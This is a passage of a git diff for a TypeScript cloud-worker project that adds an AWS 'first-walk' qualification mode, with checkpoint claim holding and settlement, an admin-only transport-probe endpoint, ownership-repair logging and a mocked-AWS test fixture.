++        /^[0-9a-f]{8}(?:-[0-9a-f]{4}){3}-[0-9a-f]{12}$/.test(version),
++    )
++  )
++    throw new Error("invalid transport probe request");
++  validateExactTransportIdentity(request.identity);
++  validateRunWindow(request.identity);
++  const expiresAt = Date.parse(request.expiresAt);
++  if (
++    typeof request.expiresAt !== "string" ||
++    request.expiresAt.length !== 24 ||
++    !Number.isFinite(expiresAt) ||
++    expiresAt <= Date.now() ||
++    expiresAt > Date.now() + 10 * 60_000 ||
++    expiresAt > Date.parse(request.identity.expiresAt)
++  )
++    throw new Error("invalid transport probe expiry");
++}
++
+ function validateRunIdentity(identity: AWSQualificationRunIdentity): void {
+   if (!/^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$/.test(identity.runId)) {
+     throw new Error("AWS qualification run id is malformed");
+@@ -2545,6 +3201,8 @@ function validateRunIdentity(identity: AWSQualificationRunIdentity): void {
+   if (!Number.isFinite(Date.parse(identity.expiresAt))) {
+     throw new Error("AWS qualification expiry is malformed");
+   }
++  if (identity.firstWalk !== undefined && identity.firstWalk !== true)
++    throw new Error("first-walk mode is malformed");
+   if (identity.retainedImage !== undefined) {
+     const retained = identity.retainedImage;
+     if (
+@@ -2563,11 +3221,18 @@ function validateRunIdentity(identity: AWSQualificationRunIdentity): void {
+ function validateRunWindow(identity: AWSQualificationRunIdentity): void {
+   const expiresAt = Date.parse(identity.expiresAt);
+   const now = Date.now();
+-  const maximum = identity.retainedImage ? awsQualificationRetainedRunMs : awsQualificationMaxRunMs;
++  const maximum = identity.firstWalk
++    ? awsQualificationFirstWalkRunMs
++    : identity.retainedImage
++      ? awsQualificationRetainedRunMs
++      : awsQualificationMaxRunMs;
+   if (expiresAt <= now || expiresAt > now + maximum) {
+     throw new Error(`AWS qualification expiry must be in the next ${maximum / 60_000} minutes`);
+   }
+-  if (identity.retainedImage && now >= expiresAt - awsQualificationCleanupReserveMs) {
++  if (
++    (identity.retainedImage || identity.firstWalk) &&
++    now >= expiresAt - (identity.firstWalk ? 20 * 60_000 : awsQualificationCleanupReserveMs)
++  ) {
+     throw new Error("AWS qualification retained work window expired");
+   }
+ }
+@@ -2671,11 +3336,18 @@ async function qualificationClientToken(runId: string, opId: string): Promise<st
+ function authorityPolicy(env: AWSQualificationAuthorityEnv): AWSQualificationPolicy {
+   const accountId = env.CRABBOX_AWS_QUALIFICATION_ACCOUNT_ID?.trim() ?? "";
+   const baseAmiId = env.CRABBOX_AWS_QUALIFICATION_BASE_AMI_ID?.trim() ?? "";
++  const roleArn = env.CRABBOX_AWS_QUALIFICATION_ROLE_ARN?.trim() ?? "";
+   const region = requireAWSRegion(env.CRABBOX_AWS_QUALIFICATION_REGION ?? "");
+   const securityGroupId = env.CRABBOX_AWS_QUALIFICATION_SECURITY_GROUP_ID?.trim() ?? "";
+   const subnetId = env.CRABBOX_AWS_QUALIFICATION_SUBNET_ID?.trim() ?? "";
+   const rootGB = Number(env.CRABBOX_AWS_QUALIFICATION_ROOT_GB ?? maxRootGB);
+   if (!/^\d{12}$/.test(accountId)) throw new Error("AWS qualification account id is malformed");
++  if (
++    !new RegExp(`^arn:aws:iam::${accountId}:role/[A-Za-z0-9+=,.@_/-]+$`).test(roleArn) ||
++    roleArn.endsWith("/")
++  ) {
++    throw new Error("AWS qualification role ARN is malformed");
++  }
+   if (!/^ami-[a-z0-9]+$/.test(baseAmiId))
+     throw new Error("AWS qualification base AMI is malformed");
+   if (!/^sg-[a-z0-9]+$/.test(securityGroupId)) {
+@@ -2687,7 +3359,19 @@ function authorityPolicy(env: AWSQualificationAuthorityEnv): AWSQualificationPol
+   if (!Number.isInteger(rootGB) || rootGB < 8 || rootGB > maxRootGB) {
+     throw new Error("AWS qualification root volume limit must be 8 through 20 GiB");
+   }
+-  return { accountId, baseAmiId, region, rootGB, securityGroupId, subnetId };
++  const networkJSON = env.CRABBOX_AWS_QUALIFICATION_NETWORK_JSON;
++  const network =
++    networkJSON === undefined ? undefined : parseQualificationNetwork(JSON.parse(networkJSON));
++  return {
++    accountId,
++    roleArn,
++    baseAmiId,
++    region,
++    rootGB,
++    securityGroupId,
++    subnetId,
++    ...(network ? { network } : {}),
++  };
+ }
+ 
+ function authorityCredentials(env: AWSQualificationAuthorityEnv): AWSCredentials {
+@@ -3053,7 +3737,7 @@ function assertLifecycleCapacity(
+     if (ledger.instanceIds.length >= maxActiveInstances || pendingActions.has("RunInstances")) {
+       throw new Error("AWS qualification allows one active instance");
+     }
+-    if (ledger.launchCount >= (identity.retainedImage ? 1 : maxLaunches)) {
++    if (ledger.launchCount >= (identity.firstWalk ? 2 : identity.retainedImage ? 1 : maxLaunches)) {
+       throw new Error("AWS qualification launch budget is exhausted");
+     }
+   }
+diff --git a/worker/src/aws-qualification-contract.ts b/worker/src/aws-qualification-contract.ts
+index 08236b760efe065be427f4705a15e144327e50cc..6d3ec979115b697eb8fc5683d891b7374432821c 100644
+--- a/worker/src/aws-qualification-contract.ts
++++ b/worker/src/aws-qualification-contract.ts
+@@ -1,4 +1,6 @@
+ export const awsQualificationMaxRunMs = 120 * 60 * 1000;
++// Includes protected deployment/arming without borrowing executor or cleanup time.
++export const awsQualificationFirstWalkRunMs = 150 * 60 * 1000;
+ export const awsQualificationRetainedRunMs = 38 * 60 * 1000;
+ export const awsQualificationCleanupReserveMs = 8 * 60 * 1000;
+ export const awsQualificationRetainedRootGB = 400;
+@@ -24,12 +26,40 @@ export interface AWSQualificationRunIdentity {
+   deploymentHash: string;
+   expiresAt: string;
+   retainedImage?: AWSQualificationRetainedImage;
++  // Opt-in one-copy first-walk qualification. Normal image qualification is unchanged.
++  firstWalk?: true;
+ }
+ 
+ export interface AWSQualificationControllerProps {
+   deploymentHash: string;
+ }
+ 
++// Pure controller identity, not authorization to access a run or AWS.
++export interface AWSQualificationBindingIdentity {
++  protocol: 1;
++  role: "controller";
++  challenge: string;
++  props: AWSQualificationControllerProps;
++  authorityVersion: string;
++}
++
++// One subordinate pre-enrollment slot; never an AWS/run owner.
++export interface AWSQualificationTransportProbe {
++  protocol: 1;
++  challenge: string;
++  identity: AWSQualificationRunIdentity;
++  candidateVersion: string;
++  authorityVersion: string;
++  expiresAt: string;
++  state: "pending" | "observed" | "verified" | "cancelled";
++  observedAt?: string;
++}
++
++export type AWSQualificationTransportProbeRequest = Omit<
++  AWSQualificationTransportProbe,
++  "protocol" | "state" | "observedAt"
++>;
++
+ export interface AWSQualificationRequest {
+   opId: string;
+   region: string;
+@@ -43,8 +73,31 @@ export interface AWSQualificationResponse {
+   body: string;
+ }
+ 
++export interface AWSQualificationFirstWalkRequest {
++  checkpointID: string;
++  claimHash: string;
++  instanceID: string;
++  snapshotID: string;
++  readinessReceiptSha256: string;
++}
++
++export interface AWSQualificationFirstWalkStatus {
++  runID: string;
++  deploymentHash: string;
++  finalized: boolean;
++  request?: AWSQualificationFirstWalkRequest;
++  phase?: "prepared" | "creating" | "created" | "attaching" | "attached";
++  volumeID?: string;
++  device?: string;
++}
++
+ export interface AWSQualificationTransportBinding {
++  observeBinding?(challenge: string): Promise<void>;
+   execute(request: AWSQualificationRequest): Promise<AWSQualificationResponse>;
++  prepareFirstWalk?(
++    request: AWSQualificationFirstWalkRequest,
++  ): Promise<AWSQualificationFirstWalkStatus>;
++  firstWalkStatus?(): Promise<AWSQualificationFirstWalkStatus>;
+ }
+ 
+ export type AWSQualificationCleanupState = "claimed" | "finalizing" | "finalized";
+@@ -133,6 +186,7 @@ export interface AWSQualificationFinalReceipt {
+ 
+ export interface AWSQualificationAttestation {
+   version: 1;
++  firstWalk?: AWSQualificationFirstWalkStatus;
+   runId: string;
+   candidateSha: string;
+   candidateWorker: string;
+diff --git a/worker/src/bootstrap.generated.ts b/worker/src/bootstrap.generated.ts
+index e87e08de02e8d9cd182a89a7ae12f34250beaec4..d84ebb74aa71e7e9f8c5dc2a3895c5ced9e97d99 100644
+--- a/worker/src/bootstrap.generated.ts
++++ b/worker/src/bootstrap.generated.ts
+@@ -112,7 +112,7 @@ export function sharedLinuxSSHRestart(): string {
+ 
+ // prettier-ignore
+ export function sharedLinuxOwnershipRepair(user: string, roots: readonly string[]): string {
+-  return "# Resolve the original user:same-named-group contract to numeric IDs once.\n# Keep traversal and updates anchored to directory descriptors; never follow symlinks.\nPATH=/usr/sbin:/usr/bin:/sbin:/bin python3 -I - " + bootstrapShellQuote(user) + " " + roots.map(bootstrapShellQuote).join(" ") + " <<'CRABBOX_OWNERSHIP'\nimport grp\nimport os\nimport pwd\nimport resource\nimport stat\nimport sys\n\nuid = pwd.getpwnam(sys.argv[1]).pw_uid\ngid = grp.getgrnam(sys.argv[1]).gr_gid\n# systemd normally starts services with a 1024 soft limit. This child uses\n# descriptors instead of following mutable ancestor paths; allow its inherited\n# hard limit without changing the bootstrap shell or any system-wide limit.\nsoft_limit, hard_limit = resource.getrlimit(resource.RLIMIT_NOFILE)\nif soft_limit != hard_limit:\n    resource.setrlimit(resource.RLIMIT_NOFILE, (hard_limit, hard_limit))\n\ndef repair(name, directory_fd):\n    info = os.stat(name, dir_fd=directory_fd, follow_symlinks=False)\n    if info.st_uid != uid or info.st_gid != gid:\n        os.chown(name, uid, gid, dir_fd=directory_fd, follow_symlinks=False)\n    return stat.S_ISDIR(info.st_mode)\n\ndef descend(name, parent_fd):\n    directory_fd = os.open(name, os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW, dir_fd=parent_fd)\n    try:\n        return directory_fd, os.scandir(directory_fd)\n    except BaseException:\n        os.close(directory_fd)\n        raise\n\nfor root in sys.argv[2:]:\n    parent, name = os.path.split(root)\n    parent_fd = os.open(parent or \".\", os.O_RDONLY | os.O_DIRECTORY)\n    stack = []\n    try:\n        if repair(name or \".\", parent_fd):\n            stack.append(descend(name or \".\", parent_fd))\n        # An explicit stack also supports trees deeper than Python's recursion limit.\n        while stack:\n            directory_fd, iterator = stack[-1]\n            entry = next(iterator, None)\n            if entry is None:\n                iterator.close()\n                os.close(directory_fd)\n                stack.pop()\n            elif repair(entry.name, directory_fd):\n                stack.append(descend(entry.name, directory_fd))\n    finally:\n        for directory_fd, iterator in reversed(stack):\n            iterator.close()\n            os.close(directory_fd)\n        os.close(parent_fd)\nCRABBOX_OWNERSHIP\n";
++  return "# Resolve the original user:same-named-group contract to numeric IDs once.\n# Keep traversal and updates anchored to directory descriptors; never follow symlinks.\n# The fixed argv label lets read-only observers distinguish this child from other Python.\nPATH=/usr/sbin:/usr/bin:/sbin:/bin python3 -I - crabbox-ownership-repair-v1 " + bootstrapShellQuote(user) + " " + roots.map(bootstrapShellQuote).join(" ") + " <<'CRABBOX_OWNERSHIP'\nimport grp\nimport os\nimport pwd\nimport resource\nimport stat\nimport sys\nimport time\n\nuid = pwd.getpwnam(sys.argv[2]).pw_uid\ngid = grp.getgrnam(sys.argv[2]).gr_gid\n# systemd normally starts services with a 1024 soft limit. This child uses\n# descriptors instead of following mutable ancestor paths; allow its inherited\n# hard limit without changing the bootstrap shell or any system-wide limit.\nsoft_limit, hard_limit = resource.getrlimit(resource.RLIMIT_NOFILE)\nif soft_limit != hard_limit:\n    resource.setrlimit(resource.RLIMIT_NOFILE, (hard_limit, hard_limit))\n\nvisited = mismatched = changed = 0\n\ndef repair(name, directory_fd):\n    global visited, mismatched, changed\n    info = os.stat(name, dir_fd=directory_fd, follow_symlinks=False)\n    visited += 1\n    if info.st_uid != uid or info.st_gid != gid:\n        mismatched += 1\n        os.chown(name, uid, gid, dir_fd=directory_fd, follow_symlinks=False)\n        changed += 1\n    return stat.S_ISDIR(info.st_mode)\n\ndef descend(name, parent_fd):\n    directory_fd = os.open(name, os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW, dir_fd=parent_fd)\n    try:\n        return directory_fd, os.scandir(directory_fd)\n    except BaseException:\n        os.close(directory_fd)\n        raise\n\nstarted = time.monotonic()\nstate = \"failed\"\nprint(\"crabbox ownership-repair state=started\", flush=True)\ntry:\n    for root in sys.argv[3:]:\n        parent, name = os.path.split(root)\n        parent_fd = os.open(parent or \".\", os.O_RDONLY | os.O_DIRECTORY)\n        stack = []\n        try:\n            if repair(name or \".\", parent_fd):\n                stack.append(descend(name or \".\", parent_fd))\n            # An explicit stack also supports trees deeper than Python's recursion limit.\n            while stack:\n                directory_fd, iterator = stack[-1]\n                entry = next(iterator, None)\n                if entry is None:\n                    iterator.close()\n                    os.close(directory_fd)\n                    stack.pop()\n                elif repair(entry.name, directory_fd):\n                    stack.append(descend(entry.name, directory_fd))\n        finally:\n            for directory_fd, iterator in reversed(stack):\n                iterator.close()\n                os.close(directory_fd)\n            os.close(parent_fd)\n    state = \"complete\"\nfinally:\n    # Counts come from this walk, without another inventory or persistent readiness state.\n    print(f\"crabbox ownership-repair state={state} visited={visited} mismatched={mismatched} changed={changed} elapsed_seconds={time.monotonic() - started:.3f}\", flush=True)\nCRABBOX_OWNERSHIP\n";
+ }
+ 
+ // prettier-ignore
+diff --git a/worker/src/checkpoints.ts b/worker/src/checkpoints.ts
+index a30b6e4647f0eae5c4076fef530bb3499c14723b..7cc4425f6459e72eb677eb290e956a145e9ba55a 100644
+--- a/worker/src/checkpoints.ts
++++ b/worker/src/checkpoints.ts
+@@ -259,7 +259,7 @@ async function nextCheckpointDeadline(
+         noCache: true,
+       },
+     ))
+-      retain(claim.expiresAt);
++      if (!claim.qualification) retain(claim.expiresAt);
+     if (
+       record.retention.mode === "expire-unused" &&
+       record.pinCount === 0 &&
+@@ -1150,7 +1150,8 @@ async function expireAvailableCheckpointClaims(
+     transaction,
+     { prefix: `checkpoint-use:${checkpoint.id}:`, limit: batchSize },
+   )) {
+-    if (claim.state === "provisioning" || Date.parse(claim.expiresAt) > now) continue;
++    if (claim.qualification || claim.state === "provisioning" || Date.parse(claim.expiresAt) > now)
++      continue;
+     await transaction.delete(key);
+     current = await writeCheckpointTransition(
+       transaction,
+@@ -1182,7 +1183,9 @@ async function validatedUseClaim(
+     claim.generation !== checkpoint.generation ||
+     claim.owner !== principal.owner ||
+     !sameOrgIdentityKey(claim.org, principal.org) ||
+-    (claim.state !== "provisioning" && Date.parse(claim.expiresAt) <= Date.now())
++    (!claim.qualification &&
++      claim.state !== "provisioning" &&
++      Date.parse(claim.expiresAt) <= Date.now())
+   ) {
+     throw new CheckpointError(
+       "checkpoint_claim_invalid",
+@@ -1272,6 +1275,8 @@ export async function bindCheckpointUseProvisioningInTransaction(
+       "create attempt is not bound to the exact checkpoint claim",
+     );
+   }
++  if (claim.qualification)
++    throw new CheckpointError("checkpoint_in_use", "checkpoint claim belongs to qualification");
+   if (claim.state === "provisioning") {
+     throw new CheckpointError(
+       "checkpoint_in_use",
+@@ -1445,6 +1450,91 @@ export async function resolveRejectedCheckpointProvisioning(
+   });
+ }
+ 
++// These helpers do not accept caller assertions as settlement authority. The
++// qualification-only route obtains binding/proof from its immutable service binding.
++export async function holdCheckpointQualificationUse(
++  storage: CoordinatorStorage,
++  checkpointID: string,
++  token: string,
++  principal: CheckpointPrincipal,
++  binding: { runID: string; deploymentHash: string },
++): Promise<void> {
++  const tokenHash = await sha256Hex(token);
++  await storage.transaction(async (transaction) => {
++    const { checkpoint, claim } = await validatedUseClaim(
++      transaction,
++      checkpointID,
++      tokenHash,
++      principal,
++    );
++    if (
++      claim.state !== "available" ||
++      (claim.qualification && JSON.stringify(claim.qualification) !== JSON.stringify(binding))
++    )
++      throw new CheckpointError("checkpoint_in_use", "checkpoint claim owns another lifecycle");
++    if (claim.qualification) return;
++    await transaction.put(checkpointUseKey(checkpointID, tokenHash), {
++      ...claim,
++      qualification: binding,
++    });
++    await writeCheckpointTransition(
++      transaction,
++      checkpoint,
++      checkpoint,
++      "checkpoint.use.qualification-held",
++      principal.owner,
++    );
++  });
++}
++
++export async function settleCheckpointQualificationUse(
++  storage: CoordinatorStorage,
++  checkpointID: string,
++  token: string,
++  principal: CheckpointPrincipal,
++  proof: {
++    runID: string;
++    deploymentHash: string;
++    finalized: boolean;
++    request?: { checkpointID: string; claimHash: string };
++  },
++): Promise<void> {
++  const tokenHash = await sha256Hex(token);
++  await storage.transaction(async (transaction) => {
++    const checkpoint = requireVisible(
++      await transaction.get<CoordinatorCheckpointRecord>(checkpointKey(checkpointID)),
++      principal,
++    );
++    const claim = await transaction.get<CoordinatorCheckpointUseClaim>(
++      checkpointUseKey(checkpointID, tokenHash),
++    );
++    // A run with no dispatched first-walk intent can also settle a prepare-before-RPC crash.
++    if (!proof.finalized)
++      throw new CheckpointError("checkpoint_in_use", "qualification has not settled this claim");
++    if (!claim) return;
++    if (
++      !claim.qualification ||
++      claim.generation !== checkpoint.generation ||
++      claim.owner !== principal.owner ||
++      !sameOrgIdentityKey(claim.org, principal.org) ||
++      claim.qualification.runID !== proof.runID ||
++      claim.qualification.deploymentHash !== proof.deploymentHash
++    )
++      throw new CheckpointError(
++        "checkpoint_claim_invalid",
++        "qualification settlement binding mismatch",
++      );
++    await transaction.delete(checkpointUseKey(checkpointID, tokenHash));
++    await writeCheckpointTransition(
++      transaction,
++      checkpoint,
++      { ...checkpoint, activeUseCount: Math.max(0, checkpoint.activeUseCount - 1) },
++      "checkpoint.use.qualification-settled",
++      principal.owner,
++    );
++  });
++}
++
+ export async function renewCheckpointUse(
+   storage: CoordinatorStorage,
+   checkpointID: string,
+@@ -1564,6 +1654,8 @@ export async function finishCheckpointUse(
+       tokenHash,
+       principal,
+     );
++    if (claim.qualification)
++      throw new CheckpointError("checkpoint_in_use", "qualification settlement proof is required");
+     if (complete && claim.state !== "provisioning") {
+       throw new CheckpointError(
+         "checkpoint_claim_invalid",
+@@ -1681,7 +1773,11 @@ export async function claimCheckpointDeletion(
+         noCache: true,
+       },
+     )) {
+-      if (claim.state === "provisioning" || Date.parse(claim.expiresAt) > now) {
++      if (
++        claim.qualification ||
++        claim.state === "provisioning" ||
++        Date.parse(claim.expiresAt) > now
++      ) {
+         throw new CheckpointError("checkpoint_in_use", "checkpoint has an active use claim");
+       }
+       // A rejected deletion rolls back these expired-claim removals with the transaction.
+@@ -2247,6 +2343,7 @@ export async function expireCheckpointClaims(
+       },
+     )) {
+       const expired = Date.parse(claim.expiresAt) <= now;
++      if (claim.qualification) continue;
+       if (claim.state === "provisioning") {
+         const attempt = claim.leaseID
+           ? await transaction.get<CreateAttemptRecord>(`create-attempt:${claim.leaseID}`)
+diff --git a/worker/src/coordinator-entry.ts b/worker/src/coordinator-entry.ts
+index 97372f5d95daa69984ec4a2452cb316f2817b9b6..58418a41c6a08a74344013f08db97e61469e6552 100644
+--- a/worker/src/coordinator-entry.ts
++++ b/worker/src/coordinator-entry.ts
+@@ -22,6 +22,7 @@ import {
+   isPairingGrantRequest,
+   pairingRequestBodyBytes,
+ } from "./pairing";
++import { qualificationTransportProbeResponse } from "./qualification-transport-probe";
+ import { runtimeAdapterProxyPath, runtimeAdapterRelayMethodAllowed } from "./runtime-adapter-relay";
+ import { serveDisabledResponse, serveBodyLimit } from "./serve";
+ import { timingSafeEqual } from "./timing-safe";
+@@ -42,6 +43,8 @@ export async function routeCoordinatorRequest(
+   if ("response" in prepared) {
+     return prepared.response;
+   }
++  const probe = await qualificationTransportProbeResponse(prepared.request, env);
++  if (probe) return probe;
+   return fleetFetch(prepared.request);
+ }
+ 
+diff --git a/worker/src/fleet.ts b/worker/src/fleet.ts
+index 65b7360e3d875847d8d499a5274be165560fbee3..1a5b564d7a09e40991e0590b7cbab591cab6d659 100644
+--- a/worker/src/fleet.ts
++++ b/worker/src/fleet.ts
+@@ -201,6 +201,8 @@ import {
+   finalizeCheckpointDeletion,
+   findManagedCheckpointImage,
+   finishCheckpointUse,
++  holdCheckpointQualificationUse,
++  settleCheckpointQualificationUse,
+   markCheckpointProviderMutationStarted,
+   markCheckpointProviderDeleted,
+   pinCheckpointPromotion,
+@@ -16990,6 +16992,74 @@ export class FleetCoordinator {
+         await this.scheduleCheckpointAlarm();
+         return json({ checkpoint: publicCheckpointRecord(checkpoint) });
+       }
++      if (parts.length === 4 && parts[3] === "first-walk" && method === "POST") {
++        const transport = this.env.CRABBOX_AWS_QUALIFICATION_TRANSPORT;
++        if (!isAdminRequest(request) || !transport?.firstWalkStatus || !transport.prepareFirstWalk)
++          return notFound();
++        const body = await readJson<{
++          action?: string;
++          claim?: string;
++          leaseID?: string;
++          readinessReceiptSha256?: string;
++        }>(request);
++        if (typeof body.claim !== "string" || !body.claim)
++          throw new CheckpointError("checkpoint_claim_invalid", "claim required");
++        const status = await transport.firstWalkStatus();
++        if (body.action === "settle") {
++          await settleCheckpointQualificationUse(
++            this.state.storage,
++            checkpointID,
++            body.claim,
++            principal,
++            status,
++          );
++          await this.scheduleCheckpointAlarm();
++          return json({ settled: true });
++        }
++        if (body.action !== "prepare" || !/^[a-f0-9]{64}$/.test(body.readinessReceiptSha256 ?? ""))
++          throw new CheckpointError(
++            "invalid_checkpoint_use",
++            "exact stock readiness receipt required",
++          );
++        const lease = await this.state.storage.get<LeaseRecord>(`lease:${body.leaseID}`);
++        const snapshots = current.image?.snapshotIDs ?? [];
++        if (
++          current.provider !== "aws" ||
++          current.target !== "linux" ||
++          snapshots.length !== 1 ||
++          !lease ||
++          lease.state !== "active" ||
++          lease.provider !== "aws" ||
++          lease.target !== "linux" ||
++          lease.checkpointID ||
++          lease.cleanupStartedAt ||
++          lease.cleanupRetryAt ||
++          lease.owner !== principal.owner ||
++          !sameOrgIdentityKey(lease.org, principal.org)
++        )
++          throw new CheckpointError(
++            "checkpoint_source_mismatch",
++            "one AWS capture and an owned stock lease are required",
++          );
++        await holdCheckpointQualificationUse(
++          this.state.storage,
++          checkpointID,
++          body.claim,
++          principal,
++          { runID: status.runID, deploymentHash: status.deploymentHash },
++        );
++        await this.scheduleCheckpointAlarm();
++        // Retain the claim after every error/uncertain response. The authority's
++        // finalized readback is the only path that can release it.
++        const result = await transport.prepareFirstWalk({
++          checkpointID,
++          claimHash: await sha256Hex(body.claim),
++          instanceID: lease.cloudID,
++          snapshotID: snapshots[0]!,
++          readinessReceiptSha256: body.readinessReceiptSha256!,
++        });
++        return json(result);
++      }
+       if (parts.length === 4 && parts[3] === "use" && method === "POST") {
+         const body = await readJson<{ action?: unknown; claim?: unknown }>(request);
+         if (body.action === "begin") {
+diff --git a/worker/src/qualification-transport-probe.ts b/worker/src/qualification-transport-probe.ts
+new file mode 100644
+index 0000000000000000000000000000000000000000..33a67193892127940d25df086553af92aab7c92b
+--- /dev/null
++++ b/worker/src/qualification-transport-probe.ts
+@@ -0,0 +1,61 @@
++import { isAdminRequest } from "./auth";
++import { json } from "./http";
++import type { Env } from "./types";
++
++// Runs after normal coordinator authentication and before Fleet. No run, lease or
++// AWS operation is admitted here, and no candidate HTTP reply is an attestation.
++export async function qualificationTransportProbeResponse(
++  request: Request,
++  env: Env,
++): Promise<Response | undefined> {
++  const url = new URL(request.url);
++  if (url.pathname !== "/v1/qualification/transport-probe") return undefined;
++  if (
++    request.method !== "POST" ||
++    url.search ||
++    !isAdminRequest(request) ||
++    !env.CRABBOX_AWS_QUALIFICATION_TRANSPORT?.observeBinding
++  )
++    return json({ error: "not_found" }, { status: 404 });
++  const reader = request.body?.getReader();
++  let timer: ReturnType<typeof setTimeout> | undefined;
++  try {
++    const work = (async () => {
++      if (!reader) throw new Error("missing challenge");
++      let text = "";
++      const decoder = new TextDecoder();
++      let size = 0;
++      for (;;) {
++        // Reads on one bounded stream must remain ordered.
++        // eslint-disable-next-line no-await-in-loop
++        const { value, done } = await reader.read();
++        if (done) break;
++        size += value.byteLength;
++        if (size > 128) throw new Error("challenge too large");
++        text += decoder.decode(value, { stream: true });
++      }
++      text += decoder.decode();
++      const input = JSON.parse(text);
++      if (
++        !input ||
++        Object.keys(input).join(",") !== "challenge" ||
++        typeof input.challenge !== "string" ||
++        !/^[0-9a-f]{64}$/.test(input.challenge)
++      )
++        throw new Error("invalid challenge");
++      await env.CRABBOX_AWS_QUALIFICATION_TRANSPORT!.observeBinding!(input.challenge);
++      return json({ accepted: true }, { headers: { "cache-control": "no-store" } });
++    })();
++    return await Promise.race([
++      work,
++      new Promise<Response>((_, reject) => {
++        timer = setTimeout(() => reject(new Error("probe timeout")), 5000);
++      }),
++    ]);
++  } catch {
++    return json({ error: "transport_probe_failed" }, { status: 409 });
++  } finally {
++    if (timer !== undefined) clearTimeout(timer);
++    void reader?.cancel().catch(() => {});
++  }
++}
+diff --git a/worker/src/types.ts b/worker/src/types.ts
+index 41cd7f8c2ed3afa1762db701000d41d1fb51f557..9914d4b035796fdf49e6d1f7f4946ac450418082 100644
+--- a/worker/src/types.ts
++++ b/worker/src/types.ts
+@@ -1065,6 +1065,8 @@ export interface CoordinatorCheckpointUseClaim {
+   createdAt: string;
+   expiresAt: string;
+   state: "available" | "provisioning";
++  // An existing use claim, held until the bound qualification owner proves settlement.
++  qualification?: { runID: string; deploymentHash: string };
+   attemptID?: string;
+   leaseID?: string;
+ }
+diff --git a/worker/test/aws-first-walk.test.ts b/worker/test/aws-first-walk.test.ts
+new file mode 100644
+index 0000000000000000000000000000000000000000..1dc196fdb2392960e2eeb9ca296cbf0730229b03
+--- /dev/null
++++ b/worker/test/aws-first-walk.test.ts
+@@ -0,0 +1,258 @@
++import { describe, expect, it } from "vitest";
++
++import {
++  cleanupFirstWalk,
++  prepareFirstWalk,
++  type FirstWalkOwner,
++  type FirstWalkState,
++} from "../src/aws-first-walk";
++import type { AWSQualificationFirstWalkRequest } from "../src/aws-qualification-contract";
++
++const request: AWSQualificationFirstWalkRequest = {
++  checkpointID: "chk_capture",
++  claimHash: "a".repeat(64),
++  instanceID: "i-11111111",
++  snapshotID: "snap-22222222",
++  readinessReceiptSha256: "b".repeat(64),
++};
++function fixture() {
++  let state: FirstWalkState | undefined;
++  let volume = false,
++    attached = false,
++    dot = false;
++  let occupied = false,
++    foreign = false,
++    cancelled = false;
++  let loss: string | undefined, reject: string | undefined;
++  let visible = true;
++  const calls: Array<{ action: string; parameters: Record<string, string>; mutating: boolean }> =
++    [];
++  const owner: FirstWalkOwner = {
++    identity: {
++      runId: "test-1",
++      owner: "fixture",
++      candidateSha: "c".repeat(40),
++      candidateWorker: "private-fixture",
++      deploymentHash: "d".repeat(64),
++      expiresAt: "2099-01-01T00:00:00Z",
++      firstWalk: true,
++    },
++    accountID: "123456789012",
++    read: async () => structuredClone(state),
++    write: async (s) => {
++      state = structuredClone(s);
++    },
++    query: async (action, parameters, mutating = false) => {
++      calls.push({ action, parameters, mutating });
++      if (mutating && cancelled) throw new Error("fenced");
++      if (reject === action) throw new Error("denied");
++      let body = "";
++      if (action === "DescribeInstances")
++        body = `<reservationSet><item><ownerId>123456789012</ownerId><instancesSet><item><instanceId>${request.instanceID}</instanceId><instanceState><name>running</name></instanceState><placement><availabilityZone>us-east-1a</availabilityZone></placement><tagSet><item><key>crabbox_qualification_run</key><value>test-1</value></item></tagSet><blockDeviceMapping><item><deviceName>/dev/sda1</deviceName><ebs><volumeId>vol-55555555</volumeId></ebs></item>${attached || occupied ? `<item><deviceName>/dev/sdf</deviceName><ebs><volumeId>vol-33333333</volumeId><deleteOnTermination>${dot}</deleteOnTermination></ebs></item>` : ""}</blockDeviceMapping></item></instancesSet></item></reservationSet>`;
++      if (action === "DescribeSnapshots")
++        body = `<snapshotSet><item><snapshotId>${request.snapshotID}</snapshotId><ownerId>123456789012</ownerId><status>completed</status><volumeSize>8</volumeSize></item></snapshotSet>`;
++      if (action === "CreateVolume") {
++        volume = true;
++        body = "<volumeId>vol-33333333</volumeId>";
++      }
++      if (action === "AttachVolume") attached = true;
++      if (action === "ModifyInstanceAttribute") dot = true;
++      if (action === "DeleteVolume") volume = false;
++      if (action === "DescribeVolumes") {
++        if (!volume && parameters["VolumeId.1"]) throw new Error("InvalidVolume.NotFound");
++        body = `<volumeSet>${
++          volume && visible
++            ? `<item><volumeId>vol-33333333</volumeId><snapshotId>${request.snapshotID}</snapshotId><availabilityZone>us-east-1a</availabilityZone><size>8</size><volumeType>gp3</volumeType><iops>3000</iops><throughput>125</throughput><encrypted>true</encrypted><status>${attached ? "in-use" : "available"}</status><tagSet>${Object.entries(
++                {
++                  crabbox_qualification_run: foreign ? "foreign" : "test-1",
++                  crabbox_qualification_owner: "fixture",
++                  crabbox_qualification_sha: "c".repeat(40),
++                  crabbox_qualification_expiry: "2099-01-01T00:00:00Z",
++                  crabbox_qualification_op: "first-walk-data",
++                },
++              )
++                .map(([key, value]) => `<item><key>${key}</key><value>${value}</value></item>`)
++                .join(
++                  "",
++                )}</tagSet><attachmentSet>${attached ? `<item><instanceId>${request.instanceID}</instanceId><device>/dev/sdf</device><status>attached</status></item>` : ""}</attachmentSet></item>`
++            : ""
++        }</volumeSet>`;
++      }
++      if (loss === action) {
++        loss = undefined;
++        throw new Error("response lost after effect");
++      }
++      return `<${action}Response>${body}</${action}Response>`;
++    },
++  };
++  return {
++    owner,
++    calls,
++    get state() {
++      return state;
++    },
++    set loss(v: string | undefined) {
++      loss = v;
++    },
++    set reject(v: string | undefined) {
++      reject = v;
++    },
++    set occupied(v: boolean) {
++      occupied = v;
++    },
++    set foreign(v: boolean) {
++      foreign = v;
++    },
++    set cancelled(v: boolean) {
++      cancelled = v;
++    },
++    set visible(v: boolean) {
++      visible = v;
++    },
++    settleGuest() {
++      attached = false;
++    },
++    get volume() {
++      return volume;
++    },
++  };
++}
++async function complete(f: ReturnType<typeof fixture>) {
++  for (let i = 0; i < 4; i++) {
++    try {
++      // oxlint-disable-next-line eslint/no-await-in-loop -- each retry depends on the previous persisted outcome.
++      return await prepareFirstWalk(f.owner, request);
++    } catch (error) {
++      if (!/dispatched|readback/.test(String(error))) throw error;
++    }
++  }
